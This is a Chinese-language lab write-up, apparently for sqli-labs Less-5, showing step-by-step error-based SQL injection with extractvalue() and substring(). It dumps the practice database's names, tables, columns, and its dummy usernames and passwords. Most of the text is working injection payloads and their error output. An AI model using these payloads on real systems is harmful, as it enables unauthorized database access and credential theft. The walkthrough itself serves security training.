---
title: lees5
url: https://www.yuque.com/u29002979/ep2zrx/bwy3pffofh4g8gg8
---

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

`?id=1'`有报错

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

**用'闭合**
`?id=1' order by 4--+`提示第4列不存在
`?id=1' order by 3--+` 发现没有了用户和ID的回显，只有”You are ing..",

`?id=1' union select 1,2,3--+`也只显示”You are ing.."，没有显示回显点。
`?id=1'and 1=2--+`没有回显条件为假的错误。

条件正确有回显，条件错误没有回显；
有报错回显， 采取报错注入的方法， <a name="QcX1G"></a>

# 报错注入

**报错注入**的运用前提是需要有数据库错误的显示

```bash
print_r(mysql_error());是能够使用报错的前提。
```

报错常用的三个函数，**extractvalue()**,**updatexml(),floor()**,还有**exp() **

<a name="tKncj"></a>

# 用extractvalue函数进行报错注入

extractvalue(1,1) <a name="FbE6V"></a>

## 查看数据库名称

`?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+`
或
`?id=1' or extractvalue(1,concat(0x7e,(select database()),0x7e))--+`

> 显示XPATH syntax error: '~security~'
> XPATH语法错误：“~security~”

<a name="FheLm"></a>

## 查看数据表名称

`?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+`

> 显示XPATH syntax error: '~emails,referers,uagents,users~'
> XPATH语法错误：'~emails，referers，uagents，users~'

<a name="pidlo"></a>

## 查看字段名称

`?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))--+`

> 显示XPATH syntax error: '**~user\_id,first\_name,last\_name,us**'
> group\_concat()函数**可能放不下所有内容**，可以采用**截取**或者**limit函数**读取

可以看出，爆出的字段名称长度超出了32，所以需要使用substring（）函数每隔32位截取一次，最终拼凑出全部内容。
`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),1,31),0x7e))--+`

> XPATH syntax error: '~user\_id,first\_name,last\_name,us'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),32,31),0x7e))--+`

> XPATH syntax error: '~er,password,avatar,last\_login,f'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),64,31),0x7e))--+`

> XPATH syntax error: '~iled\_login,USER,CURRENT\_CONNECT'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),95,31),0x7e))--+`

> XPATH syntax error: '~IONS,TOTAL\_CONNECTIONS,id,usern'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),126,31),0x7e))--+`

> XPATH syntax error: '~ame,password~'

**拼接：**
user\_id,
first\_name,
last\_name,
user,
password,
avatar,
last\_login,
filed\_login,
USER,
CURRENT\_CONNECT~IONS,
TOTAL\_CONNECTIONS,
id,
username,
password <a name="g9URs"></a>

### 或者只查看当前数据库表字段名称：

`?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e))--+`

> XPATH syntax error: '~id,username,password~'

<a name="fpIUQ"></a>

## 查看字段内容

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e))--+`

> XPATH syntax error: '~Dumb^Dumb,Angelina^I-kill-you,D'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),32,31),0x7e))--+`

> XPATH syntax error: '~ummy^p@ssword,secure^crappy,stu'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),63,31),0x7e))--+`

> XPATH syntax error: '~pid^stupidity,superman^genious,'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),94,31),0x7e))--+`

> XPATH syntax error: '~batman^mob!le,admin^admin,admin'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),125,31),0x7e))--+`

> XPATH syntax error: '~1^admin1,admin2^admin2,admin3^a'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),156,31),0x7e))--+`

> XPATH syntax error: '~dmin3,dhakkan^dumbo,admin4^admi'

`?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),187,31),0x7e))--+`

> XPATH syntax error: '~n4~'

拼接用户^密码：
Dumb^Dumb,
Angelina^I-kill-you,
Dummy^p@ssword,
secure^crappy,
stupid^stupidity,
superman^genious,
batman^mob!le,
admin^admin,
admin1^admin1,
admin2^admin2,
admin3^admin3,
dhakkan^dumbo,
admin4^admin4
